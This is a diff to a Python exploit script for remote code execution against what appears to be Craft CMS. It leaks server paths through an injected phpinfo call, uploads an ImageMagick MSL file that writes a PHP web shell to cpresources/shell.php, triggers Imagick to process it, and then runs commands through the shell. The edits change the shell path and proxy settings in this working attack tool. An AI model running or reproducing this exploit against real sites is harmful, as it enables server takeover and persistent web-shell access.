@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-
 import requests
 import re
 import sys
@@ -20,11 +18,11 @@ def writePayloadToTempFile(documentRoot):
         "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
         <image>
         <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
-        <write filename="info:DOCUMENTROOT/shell.php">
+        <write filename="info:DOCUMENTROOT/cpresources/shell.php">
         </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
     }
 
-    response = requests.post(url, headers=headers, data=data, files=files, proxies={"http": "http://localhost:8080"})
+    response = requests.post(url, headers=headers, data=data, files=files)
 
 def getTmpUploadDirAndDocumentRoot():
     data = {
@@ -33,15 +31,13 @@ def getTmpUploadDirAndDocumentRoot():
         "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
     }
 
-    response = requests.post(url, headers=headers, data=data)
+    response = requests.post(url, headers=headers, data=data, proxies={"http": "http://127.0.0.1:8080"})
 
     pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
     pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
    
-    #match1 is empty
     match1 = re.search(pattern1, response.text, re.DOTALL)
     match2 = re.search(pattern2, response.text, re.DOTALL)
-
     return match1.group(1), match2.group(1)
 
 def trigerImagick(tmpDir):
@@ -51,10 +47,10 @@ def trigerImagick(tmpDir):
         "configObject[class]": "craft\elements\conditions\ElementCondition",
         "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
     }
-    response = requests.post(url, headers=headers, data=data, proxies={"http": "http://127.0.0.1:8080"})    
+    response = requests.post(url, headers=headers, data=data)    
 
 def shell(cmd):
-    response = requests.get(url + "/shell.php", params={"cmd": cmd})
+    response = requests.get(url + "/cpresources/shell.php", params={"cmd": cmd})
     match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)
 
     if match:
@@ -72,7 +68,7 @@ if __name__ == "__main__":
         url = sys.argv[1]
         print("[-] Get temporary folder and document root ...")
         upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
-        tmpDir = "/tmp" if upload_tmp_dir == "no value" else upload_tmp_dir
+        tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
         print("[-] Write payload to temporary file ...")
         try:
             writePayloadToTempFile(documentRoot)
@@ -83,7 +79,6 @@ if __name__ == "__main__":
         try:
             trigerImagick(tmpDir)
         except:
-            print('error')
             pass
 
         print("[-] Done, enjoy the shell")
